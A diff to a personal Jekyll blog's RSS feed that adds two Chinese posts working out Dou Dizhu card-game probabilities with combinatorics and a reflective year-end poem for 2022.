@@ -6,9 +6,418 @@
     <description>欢迎来到我的个人站~</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 27 Nov 2022 22:02:29 +0800</pubDate>
-    <lastBuildDate>Sun, 27 Nov 2022 22:02:29 +0800</lastBuildDate>
+    <pubDate>Fri, 13 Jan 2023 21:46:28 +0800</pubDate>
+    <lastBuildDate>Fri, 13 Jan 2023 21:46:28 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+    <item>
+      <title>斗地主出牌系列概率计算_地主方</title>
+      <description>&lt;h3 id=&quot;而立之年已然难以专注的做一些事情如此用喜欢的数学做一些想知道的事情重新培养专注力&quot;&gt;而立之年，已然难以专注的做一些事情，如此，用喜欢的数学，做一些想知道的事情。重新培养专注力。&lt;/h3&gt;
+&lt;p&gt;&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;1求解手牌无王农民中有王炸的概率-答4848&quot;&gt;&lt;strong&gt;1，求解：手牌无王，农民中有王炸的概率？ 答：48.48%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+农民甲、乙具有相同的组合概率，故只需求一人然后乘以2即可。
+设大小王为 X牌，其它牌为 T牌。   &lt;br /&gt;
+总牌数54张，去除已知手牌20张，牌堆剩余34张，其中 X牌 = 2张，T牌 = 34-2=32张，&lt;br /&gt;
+农民甲手牌所有的组合数为 34！/17！，&lt;/p&gt;
+
+&lt;p&gt;王炸在农民甲手中的组合数为 32！/15！，   &lt;br /&gt;
+农民甲有王炸的概率为  32！/15！/（34！/17！）=8/33,&lt;br /&gt;
+所以 手牌无王，农民中有王炸的概率 为 8/33 * 2 = 0.4848484848，大概 48.48%&lt;/p&gt;
+
+&lt;h2 id=&quot;2求解手牌断一张普通牌农民中刚好有炸弹的概率-答1026&quot;&gt;&lt;strong&gt;2，求解：手牌断一张普通牌，农民中刚好有炸弹的概率？ 答：10.26%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+农民甲、乙具有相同的组合概率，故只需求一人然后乘以2即可。&lt;br /&gt;
+设断张为 X牌，其它牌为 T牌。   &lt;br /&gt;
+总牌数54张，去除已知手牌20张，牌堆剩余34张，其中 X牌 = 4张，T牌 = 34-4=30张，&lt;br /&gt;
+农民甲手牌所有的组合数为 34！/17！，&lt;/p&gt;
+
+&lt;p&gt;炸弹在农民甲手中的组合数为 30！/13！，   &lt;br /&gt;
+农民甲有炸弹的概率为  30！/13！/（34！/17！）=35/682,&lt;br /&gt;
+所以 手牌断一张普通牌，农民中刚好有炸弹的概率 为 35/682 * 2 = 0.1026392961，大概 10.26%&lt;/p&gt;
+
+&lt;h2 id=&quot;3求解手牌断两张普通牌农民中至少有一个炸弹的概率-答2026&quot;&gt;&lt;strong&gt;3，求解：手牌断两张普通牌，农民中至少有一个炸弹的概率？ 答：20.26%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+农民甲、乙具有相同的组合概率，故只需求一人然后乘以2即可。&lt;br /&gt;
+设断张为 X牌，Y牌，其它牌为 T牌。   &lt;br /&gt;
+总牌数54张，去除已知手牌20张，牌堆剩余34张，其中 X牌 = 4张，Y牌 = 4张，T牌 = 34-4-4=26张，&lt;br /&gt;
+农民甲手牌所有的组合数为 34！/17！，&lt;/p&gt;
+
+&lt;p&gt;X炸弹在农民甲手中的组合数为 30！/13！，   &lt;br /&gt;
+Y炸弹在农民甲手中的组合数为 30！/13！，   &lt;br /&gt;
+X炸弹和Y炸弹同时都在农民甲手中的组合数为 26！/9！，&lt;br /&gt;
+则农民甲至少有一个炸弹的组合数为 30！/13！+30！/13！- 26！/9！， &lt;br /&gt;
+农民甲至少有一个炸弹的概率为  （30！/13！+30！/13！- 26！/9！）/（34！/17！）=35/682 * 2 - 65/48546 = 0.1026392961 - 0.0013389362 = 0.1013,&lt;br /&gt;
+所以 手牌断两张普通牌，农民中至少有一个炸弹的概率 为 0.1013 * 2 = 0.2026，大概 20.26%&lt;/p&gt;
+
+&lt;p&gt;顺便得到 手牌断两张普通牌，农民有两个炸弹，且炸弹在一家的概率 为 65/48546 * 2 = 0.26%&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2023/01/斗地主_出牌系列概率计算_地主方/&quot;&gt; 斗地主出牌系列概率计算_地主方 &lt;/a&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+      <pubDate>Tue, 03 Jan 2023 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2023/01/%E6%96%97%E5%9C%B0%E4%B8%BB_%E5%87%BA%E7%89%8C%E7%B3%BB%E5%88%97%E6%A6%82%E7%8E%87%E8%AE%A1%E7%AE%97_%E5%9C%B0%E4%B8%BB%E6%96%B9/</link>
+      <guid isPermaLink="true">http://localhost:4000/2023/01/%E6%96%97%E5%9C%B0%E4%B8%BB_%E5%87%BA%E7%89%8C%E7%B3%BB%E5%88%97%E6%A6%82%E7%8E%87%E8%AE%A1%E7%AE%97_%E5%9C%B0%E4%B8%BB%E6%96%B9/</guid>
+        
+      <category>斗地主中的排列组合分析</category>
+        
+        
+    </item>
+    
+    <item>
+      <title>斗地主补牌系列概率计算</title>
+      <description>&lt;h3 id=&quot;而立之年已然难以专注的做一些事情如此用喜欢的数学做一些想知道的事情重新培养专注力&quot;&gt;而立之年，已然难以专注的做一些事情，如此，用喜欢的数学，做一些想知道的事情。重新培养专注力。&lt;/h3&gt;
+&lt;p&gt;&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;1求解手牌无王底牌中出现王炸的概率-答045&quot;&gt;&lt;strong&gt;1，求解：手牌无王，底牌中出现王炸的概率？ 答：0.45%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+设大小王为 X牌，其它牌为 T牌。  &lt;br /&gt;
+则满足条件的底牌组合为 X X T， &lt;br /&gt;
+总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 2张，T牌 = 37-2=35张，&lt;br /&gt;
+所以满足条件的组合数为 2*1/(2*1)*35 = 35种，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;br /&gt;
+所以 底牌中出现王炸的概率 为 35/7770=0.0045045045，大概 0.45%。&lt;/p&gt;
+
+&lt;p&gt;同理，底牌存在一张王的组合为 X T T，&lt;br /&gt;
+满足 X T T 的组合数为 2*35*34/（2*1） = 1190种，&lt;br /&gt;
+则 底牌中只出现一张王的概率 为 1190/7770=0.1531531531，大概 15.32%。&lt;/p&gt;
+
+&lt;p&gt;同理，底牌不存在王的组合为 T T T，&lt;br /&gt;
+满足 T T T 的组合数为 35*34*33/(3*2*1) = 6545种，&lt;br /&gt;
+则 底牌中没有王的概率 为 6545/7770=0.8423423423，大概 84.23%。&lt;/p&gt;
+
+&lt;h2 id=&quot;2求解手牌中有一张王底牌补成王炸概率-答811&quot;&gt;&lt;strong&gt;2，求解：手牌中有一张王，底牌补成王炸概率？ 答：8.11%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+设王牌为 X牌，其它牌为 T牌。  &lt;br /&gt;
+则满足条件的底牌组合为 X T T， &lt;br /&gt;
+总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 1张，T牌 = 37-1=36张，&lt;br /&gt;
+所以满足条件的组合数为 1*36*35/(2*1) = 630种，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;br /&gt;
+所以 手牌种有一张王，底牌补成王炸概率 为 1260/7770=0.0810810810，大概 8.11%。&lt;/p&gt;
+
+&lt;h2 id=&quot;3求解底牌中出现某普通牌断张的概率-答2978&quot;&gt;&lt;strong&gt;3，求解：底牌中出现某普通牌断张的概率？ 答：29.78%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+设需要的断张牌为 X牌，其它牌为 T牌。  &lt;br /&gt;
+则满足条件的底牌组合有 X T T，X X T，X X X 三种，而不满足条件的为T T T 一种，&lt;br /&gt;
+显然求不满足的 T T T 组合要简单一些，&lt;br /&gt;
+总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 4张，T牌 = 37-4=33张，&lt;br /&gt;
+则 T T T 组合数为 33*32*31/（3*2*1） = 5456种，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;br /&gt;
+T T T 组合概率为 5456/7770=0.7021879021，&lt;br /&gt;
+所以 底牌中出现某普通牌断张的概率 为 1-0.7021879021=0.2978120979，大概 29.78%。&lt;/p&gt;
+
+&lt;p&gt;顺便我们求一下，&lt;br /&gt;
+X T T 的组合数为 4*33*32/（2*1）= 2112种，&lt;br /&gt;
+2112/7770 = 0.2718146718，大概27.18%；&lt;/p&gt;
+
+&lt;p&gt;X X T 的组合数为 4*3/（2*1）*33 = 198种，&lt;br /&gt;
+198/7770 = 0.0254826254，大概2.55%；&lt;/p&gt;
+
+&lt;p&gt;X X X 的组合数为 4*3*2/（3*2*1） = 4种，&lt;br /&gt;
+4/7770 = 0.0005148005，大概0.05%；&lt;/p&gt;
+
+&lt;p&gt;所以得出结论：&lt;br /&gt;
+底牌中只出现一张某普通牌断张的概率为 27.18%，&lt;br /&gt;
+底牌中只出现两张某普通牌断张的概率为 2.55%，&lt;br /&gt;
+底牌三张都是某普通牌断张的概率为 0.05%。&lt;/p&gt;
+
+&lt;h2 id=&quot;4求解底牌中出现某两张普通牌断张的概率-答721&quot;&gt;&lt;strong&gt;4，求解：底牌中出现某两张普通牌断张的概率？ 答：7.21%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析： 
+设需要的断张牌为 X牌，Y牌；设 P牌 为任意牌。&lt;br /&gt;
+则满足条件的底牌组合为 X Y P，&lt;br /&gt;
+总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 4张，Y牌 = 4张，P牌 = 37-1-1=35张，&lt;br /&gt;
+取一张为X的可能性 有4种，&lt;br /&gt;
+取一张为Y的可能性 有4种，&lt;br /&gt;
+取一张为P的可能性 有35种，&lt;br /&gt;
+所以满足条件的组合数为 4*4*35=560种，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;br /&gt;
+所以 底牌中出现某两张普通牌断张的概率 为 560/7770=0.0720720720，大概7.21%。&lt;/p&gt;
+
+&lt;h2 id=&quot;5求解底牌中出现某三张普通牌断张的概率-答082&quot;&gt;&lt;strong&gt;5，求解：底牌中出现某三张普通牌断张的概率？ 答：0.82%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析： 
+设需要的断张牌为 X牌，Y牌，Z牌。&lt;br /&gt;
+则满足条件的底牌组合为 X Y Z，&lt;br /&gt;
+总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 4张，Y牌 = 4张，Z牌 = 4张，&lt;br /&gt;
+取一张为X的可能性 有4种，&lt;br /&gt;
+取一张为Y的可能性 有4种，&lt;br /&gt;
+取一张为Z的可能性 有4种，&lt;br /&gt;
+所以满足条件的组合数为 4*4*4=64种， &lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种， &lt;br /&gt;
+所以 底牌中出现某两张普通牌断张的概率 为 64/7770=0.0082368082，大概0.82%。&lt;/p&gt;
+
+&lt;h2 id=&quot;6求解手牌中有一张王三个2底牌补成双王四个2的概率-答045&quot;&gt;&lt;strong&gt;6，求解：手牌中有一张王，三个2，底牌补成双王四个2的概率？ 答：0.45%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+显然，剩余37张牌中只有一个王，一个2，35张其它牌，&lt;/p&gt;
+
+&lt;p&gt;所以满足条件的组合数为 1*1*35 = 35种，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;/p&gt;
+
+&lt;p&gt;所以 手牌中有一张王，三个2，底牌补成双王四个2的概率 为 35/7770=0.0045045045，大概 0.45%。&lt;/p&gt;
+
+&lt;h2 id=&quot;7求解手牌中有一个三带底牌补成炸弹的概率-答811&quot;&gt;&lt;strong&gt;7，求解：手牌中有一个三带，底牌补成炸弹的概率？ 答：8.11%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+设此三带的牌为 X牌，其它牌为 T牌。
+则满足条件的底牌组合为 X T T，&lt;/p&gt;
+
+&lt;p&gt;总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 1张，T牌 = 36张，&lt;br /&gt;
+所以满足X T T的组合数为 1*36*35 /（2*1）= 630种，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;/p&gt;
+
+&lt;p&gt;所以 手牌中有一个三带，底牌补成炸弹的概率 为 630/7770=0.0810810810，大概 8.11%。&lt;/p&gt;
+
+&lt;h2 id=&quot;8求解手牌中有两个三带底牌至少补一个炸弹的概率-答1577&quot;&gt;&lt;strong&gt;8，求解：手牌中有两个三带，底牌至少补一个炸弹的概率？ 答：15.77%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+设两个三带的牌为 X牌，Y牌，其它牌为 T牌。
+则满足条件的底牌组合为 X Y T，X T T，Y T T，而不满足条件的底牌组合为 T T T，&lt;br /&gt;
+我们不妨先求T T T。&lt;/p&gt;
+
+&lt;p&gt;总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 1张，Y牌 = 1张，T牌 = 35张，&lt;br /&gt;
+所以满足T T T的组合数为 35*34*33 /（3*2*1）= 6545种，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;br /&gt;
+6545/7770=0.8423423423 （此为一个炸弹都没补上，大概为 84.23%）&lt;br /&gt;
+所以 手牌中有两个三带，底牌至少补一个炸弹的概率 为 1-0.8423423423=0.1576576576，大概 15.77%。&lt;/p&gt;
+
+&lt;p&gt;顺便，我们求一下：&lt;br /&gt;
+组合 X Y T，即手牌中有两个三带，底牌补两个炸弹的概率 为 &lt;br /&gt;
+组合数 1*1*35 = 35种，&lt;br /&gt;
+35/7770=0.0045045045，大概 0.45%。&lt;/p&gt;
+
+&lt;p&gt;组合 X T T 和 Y T T 的和，即手牌中有两个三带，底牌补上了且只补了一个炸弹的概率 为 &lt;br /&gt;
+X T T 组合数 1*35*34/(2*1) = 595种，&lt;br /&gt;
+Y T T 组合数 1*35*34/(2*1) = 595种，&lt;br /&gt;
+（595+595）/7770=0.1531531531，大概 15.32%。&lt;/p&gt;
+
+&lt;h2 id=&quot;9求解手牌中有三个三带底牌至少补一个炸弹的概率-答2299&quot;&gt;&lt;strong&gt;9，求解：手牌中有三个三带，底牌至少补一个炸弹的概率？ 答：22.99%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+设三个三带的牌为 X牌，Y牌，Z牌，其它牌为 T牌。
+底牌组合为&lt;br /&gt;
+T T T &amp;gt; 这个组合代表底牌一个炸弹都没补上&lt;br /&gt;
+X T T，Y T T，Z T T &amp;gt;  这三种组合之和代表底牌补上了且只补了一个炸弹&lt;br /&gt;
+X Y T，X Z T，Y Z T &amp;gt;  这三种组合之和代表底牌补上了且只补了两个炸弹&lt;br /&gt;
+X Y Z &amp;gt; 这个组合代表底牌补上了三个炸弹&lt;/p&gt;
+
+&lt;p&gt;总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 1张，Y牌 = 1张，Z牌 = 1张，T牌 = 37-1-1-1=34张，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;/p&gt;
+
+&lt;p&gt;T T T 组合数 34*33*32/（3*2*1）= 5984种，&lt;br /&gt;
+5984/7770=0.7701415701，大概 77.01%；&lt;/p&gt;
+
+&lt;p&gt;X T T，Y T T，Z T T 组合数 1*34*33/(2*1) * 3 =1683种，&lt;br /&gt;
+1683/7770=0.2166023166，大概 21.66%；&lt;/p&gt;
+
+&lt;p&gt;X Y T，X Z T，Y Z T 组合数 1*1*34 * 3 =102种，&lt;br /&gt;
+102/7770=0.0131274131，大概 1.31%；&lt;/p&gt;
+
+&lt;p&gt;X Y Z 组合数 1*1*1 = 1种，&lt;br /&gt;
+1/7770=0.0001287001，大概 0.01%；&lt;/p&gt;
+
+&lt;p&gt;所以得出结论：&lt;br /&gt;
+手牌中有三个三带，底牌一个炸弹都没补上的概率 为 77.01%，&lt;br /&gt;
+手牌中有三个三带，底牌补上了且只补了一个炸弹的概率 为 21.66%，&lt;br /&gt;
+手牌中有三个三带，底牌补上了且只补了两个炸弹的概率 为 1.31%，&lt;br /&gt;
+手牌中有三个三带，底牌补上了三个炸弹的概率 为 0.01%，&lt;br /&gt;
+手牌中有三个三带，底牌至少补一个炸弹的概率 为 1-77.01%=22.99%&lt;/p&gt;
+
+&lt;h2 id=&quot;10求解手牌中有四个三带底牌至少补一个炸弹的概率-答2878&quot;&gt;&lt;strong&gt;10，求解：手牌中有四个三带，底牌至少补一个炸弹的概率？ 答：28.78%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+设四个三带的牌为 X牌，Y牌，Z牌，J牌，其它牌为 T牌。
+底牌组合为&lt;br /&gt;
+T T T &amp;gt; 这个组合代表底牌一个炸弹都没补上&lt;br /&gt;
+X T T，Y T T，Z T T，J T T &amp;gt;  这四种组合之和代表底牌补上了且只补了一个炸弹&lt;br /&gt;
+X Y T，X Z T，X J T, Y Z T，Y J T, Z J T &amp;gt;  这六种组合之和代表底牌补上了且只补了两个炸弹&lt;br /&gt;
+X Y Z， X Y J, X Z J, Y Z J &amp;gt; 这四种组合代表底牌补上了三个炸弹&lt;/p&gt;
+
+&lt;p&gt;总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 1张，Y牌 = 1张，Z牌 = 1张，J牌 = 1张，T牌 = 37-1-1-1-1=33张，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;/p&gt;
+
+&lt;p&gt;T T T 组合数 33*32*31/（3*2*1）= 5456种，&lt;br /&gt;
+5456/7770=0.7021879021，大概 70.22%；&lt;/p&gt;
+
+&lt;p&gt;X T T，Y T T，Z T T，J T T 组合数 1*33*32/(2*1) * 4  =2112种，&lt;br /&gt;
+2112/7770=0.2718146718，大概 27.18%；&lt;/p&gt;
+
+&lt;p&gt;X Y T，X Z T，X J T, Y Z T，Y J T, Z J T 组合数 1*1*33 * 6 =198种，&lt;br /&gt;
+198/7770=0.0254826254，大概 2.55%；&lt;/p&gt;
+
+&lt;p&gt;X Y Z， X Y J, X Z J, Y Z J 组合数 1*1*1 * 4 = 4种，&lt;br /&gt;
+4/7770=0.0005148005，大概 0.05%；&lt;/p&gt;
+
+&lt;p&gt;所以得出结论：&lt;br /&gt;
+手牌中有四个三带，底牌一个炸弹都没补上的概率 为 70.22%，&lt;br /&gt;
+手牌中有四个三带，底牌补上了且只补了一个炸弹的概率 为 27.18%，&lt;br /&gt;
+手牌中有四个三带，底牌补上了且只补了两个炸弹的概率 为 2.55%，&lt;br /&gt;
+手牌中有四个三带，底牌补上了三个炸弹的概率 为 0.05%，&lt;br /&gt;
+手牌中有四个三带，底牌至少补一个炸弹的概率 为 1-70.22%=29.78%&lt;/p&gt;
+
+&lt;h2 id=&quot;11求解手牌中有五个三带底牌至少补一个炸弹的概率-答3616&quot;&gt;&lt;strong&gt;11，求解：手牌中有五个三带，底牌至少补一个炸弹的概率？ 答：36.16%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+设五个三带的牌为 X牌，Y牌，Z牌，J牌，K牌，其它牌为 T牌。
+底牌组合为&lt;br /&gt;
+T T T &amp;gt; 这个组合代表底牌一个炸弹都没补上&lt;br /&gt;
+X T T，Y T T，Z T T，J T T， K T T &amp;gt;  这五种组合之和代表底牌补上了且只补了一个炸弹&lt;br /&gt;
+X Y T，X Z T，X J T, X K T， Y Z T，Y J T，Y K T, Z J T，Z K T，J K T &amp;gt;  这十种组合之和代表底牌补上了且只补了两个炸弹&lt;br /&gt;
+X Y Z， X Y J, X Y K，X Z J, X Z K，X J K，Y Z J，Y Z K，Y J K，Z J K &amp;gt; 这十种组合代表底牌补上了三个炸弹&lt;/p&gt;
+
+&lt;p&gt;总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 1张，Y牌 = 1张，Z牌 = 1张，J牌 = 1张，K牌 = 1张，T牌 = 37-1-1-1-1-1=32张，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;/p&gt;
+
+&lt;p&gt;T T T 组合数 32*31*30/（3*2*1）= 4960种，&lt;br /&gt;
+4960/7770=0.6383526383，大概 63.84%；&lt;/p&gt;
+
+&lt;p&gt;X T T，Y T T，Z T T，J T T， K T T 组合数 1*32*31/(2*1) * 5  =2480种，&lt;br /&gt;
+2480/7770=0.3191763191，大概 31.92%；&lt;/p&gt;
+
+&lt;p&gt;X Y T，X Z T，X J T, X K T， Y Z T，Y J T，Y K T, Z J T，Z K T，J K T 组合数 1*1*32 * 10 =320种，&lt;br /&gt;
+320/7770=0.0411840411，大概 4.12%；&lt;/p&gt;
+
+&lt;p&gt;X Y Z， X Y J, X Y K，X Z J, X Z K，X J K，Y Z J，Y Z K，Y J K，Z J K 组合数 1*1*1 * 10 = 10种，&lt;br /&gt;
+10/7770=0.0012870012，大概 0.13%；&lt;/p&gt;
+
+&lt;p&gt;所以得出结论：&lt;br /&gt;
+手牌中有五个三带，底牌一个炸弹都没补上的概率 为 63.84%，&lt;br /&gt;
+手牌中有五个三带，底牌补上了且只补了一个炸弹的概率 为 31.92%，&lt;br /&gt;
+手牌中有五个三带，底牌补上了且只补了两个炸弹的概率 为 4.12%，&lt;br /&gt;
+手牌中有五个三带，底牌补上了三个炸弹的概率 为 0.13%，&lt;br /&gt;
+手牌中有五个三带，底牌至少补一个炸弹的概率 为 1-63.84%=36.16%&lt;/p&gt;
+
+&lt;h2 id=&quot;12求解手牌中有五个三带和一个王底牌至少补一个炸弹的概率-答4215&quot;&gt;&lt;strong&gt;12，求解：手牌中有五个三带和一个王，底牌至少补一个炸弹的概率？ 答：42.15%&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;分析：&lt;br /&gt;
+设五个三带的牌为 X牌，Y牌，Z牌，J牌，K牌，王为 L牌，其它牌为 T牌。
+底牌组合为&lt;br /&gt;
+T T T &amp;gt; 这个组合代表底牌一个炸弹都没补上&lt;br /&gt;
+X T T，Y T T，Z T T，J T T， K T T，L T T &amp;gt;  这六种组合之和代表底牌补上了且只补了一个炸弹&lt;br /&gt;
+X Y T，X Z T，X J T, X K T，X L T，Y Z T，Y J T，Y K T,Y L T，Z J T，Z K T，Z L T，J K T，J L T，K L T &amp;gt;  这十五种组合之和代表底牌补上了且只补了两个炸弹&lt;br /&gt;
+X Y Z， X Y J, X Y K，X Y L，X Z J, X Z K，X Z L，X J K，X J L，X K L，Y Z J，Y Z K，Y Z L，Y J K，Y J L，Y K L，Z J K，Z J L，Z K L，J K L &amp;gt; 这二十种组合代表底牌补上了三个炸弹&lt;/p&gt;
+
+&lt;p&gt;总牌数54张，去除已知手牌17张，牌堆剩余37张，其中 X牌 = 1张，Y牌 = 1张，Z牌 = 1张，J牌 = 1张，K牌 = 1张，L牌 = 1张，T牌 = 37-1-1-1-1-1-1=31张，&lt;br /&gt;
+底牌所有的组合数为 37*36*35/（3*2*1）=7770种，&lt;/p&gt;
+
+&lt;p&gt;T T T 组合数 31*30*29/（3*2*1）= 4495种，&lt;br /&gt;
+4495/7770=0.5785070785，大概 57.85%；&lt;/p&gt;
+
+&lt;p&gt;X T T，Y T T，Z T T，J T T， K T T，L T T 组合数 1*31*30/(2*1) * 6  =2790种，&lt;br /&gt;
+2790/7770=0.3590733590，大概 35.91%；&lt;/p&gt;
+
+&lt;p&gt;X Y T，X Z T，X J T, X K T，X L T，Y Z T，Y J T，Y K T,Y L T，Z J T，Z K T，Z L T，J K T，J L T，K L T 组合数 1*1*31 * 15 =465种，&lt;br /&gt;
+465/7770=0.0598455598，大概 5.98%；&lt;/p&gt;
+
+&lt;p&gt;X Y Z， X Y J, X Y K，X Y L，X Z J, X Z K，X Z L，X J K，X J L，X K L，Y Z J，Y Z K，Y Z L，Y J K，Y J L，Y K L，Z J K，Z J L，Z K L，J K L 组合数 1*1*1 * 20 = 20种，&lt;br /&gt;
+20/7770=0.0025740025，大概 0.26%；&lt;/p&gt;
+
+&lt;p&gt;所以得出结论：&lt;br /&gt;
+手牌中有五个三带和一个王，底牌一个炸弹都没补上的概率 为 57.85%，&lt;br /&gt;
+手牌中有五个三带和一个王，底牌补上了且只补了一个炸弹的概率 为 35.91%，&lt;br /&gt;
+手牌中有五个三带和一个王，底牌补上了且只补了两个炸弹的概率 为 5.98%，&lt;br /&gt;
+手牌中有五个三带和一个王，底牌补上了三个炸弹的概率 为 0.26%，&lt;br /&gt;
+手牌中有五个三带和一个王，底牌至少补一个炸弹的概率 为 1-57.85%=42.15%&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2023/01/斗地主_补牌系列概率计算/&quot;&gt; 斗地主补牌系列概率计算 &lt;/a&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+      <pubDate>Mon, 02 Jan 2023 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2023/01/%E6%96%97%E5%9C%B0%E4%B8%BB_%E8%A1%A5%E7%89%8C%E7%B3%BB%E5%88%97%E6%A6%82%E7%8E%87%E8%AE%A1%E7%AE%97/</link>
+      <guid isPermaLink="true">http://localhost:4000/2023/01/%E6%96%97%E5%9C%B0%E4%B8%BB_%E8%A1%A5%E7%89%8C%E7%B3%BB%E5%88%97%E6%A6%82%E7%8E%87%E8%AE%A1%E7%AE%97/</guid>
+        
+      <category>斗地主中的排列组合分析</category>
+        
+        
+    </item>
+    
+    <item>
+      <title>我的2022年终总结</title>
+      <description>&lt;h3 id=&quot;如果重来一次你会把这段荒唐的时光略过去么&quot;&gt;如果重来一次，你会把这段荒唐的时光略过去么?&lt;/h3&gt;
+&lt;p&gt;&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;我总是流离进夜色中，&lt;br /&gt;
+在安静的时光中恍惚，&lt;br /&gt;
+一次又一次的享受着忘我的境界，&lt;br /&gt;
+轮回，又一个轮回。&lt;/p&gt;
+
+&lt;p&gt;我不厌其烦的重复着，&lt;br /&gt;
+像极了时空的钟摆，&lt;br /&gt;
+梦着，清醒着，游离着，&lt;br /&gt;
+感动与自我感动，&lt;br /&gt;
+批评，反省，沉醉，&lt;br /&gt;
+编织美丽的世界，&lt;br /&gt;
+沉溺于梦境，献出幸福的笑声。&lt;/p&gt;
+
+&lt;p&gt;我痛恨世道的堕落，&lt;br /&gt;
+孤独且悲悯的控诉，&lt;br /&gt;
+以此为凭，&lt;br /&gt;
+享受着片段的生命。&lt;/p&gt;
+
+&lt;p&gt;我明白所处的境地，&lt;br /&gt;
+并非无能为力，&lt;br /&gt;
+而却依然无所为，&lt;br /&gt;
+深深的疲惫，釜底抽薪般。&lt;/p&gt;
+
+&lt;p&gt;时间啊时间，&lt;br /&gt;
+生命啊生命，&lt;br /&gt;
+你可曾知道你是如此的廉价，&lt;br /&gt;
+我微笑着表示歉意。&lt;/p&gt;
+
+&lt;p&gt;有所坚持，&lt;br /&gt;
+有所期待，&lt;br /&gt;
+有一点生活，&lt;br /&gt;
+有一点乐观，&lt;br /&gt;
+已所剩不多，&lt;br /&gt;
+会不会，&lt;br /&gt;
+付之东流，走向灭亡。&lt;/p&gt;
+
+&lt;p&gt;爆发吧，灭亡吧。&lt;br /&gt;
+悄悄是别离的笙箫，&lt;br /&gt;
+夏虫也为我沉默，&lt;br /&gt;
+沉默是今晚的康桥。&lt;/p&gt;
+
+&lt;p&gt;我心隐匿于黑暗。&lt;/p&gt;
+
+&lt;p&gt;你可知我心。&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2023/01/我的2022年终总结/&quot;&gt; 我的2022年终总结 &lt;/a&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+      <pubDate>Sun, 01 Jan 2023 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2023/01/%E6%88%91%E7%9A%842022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
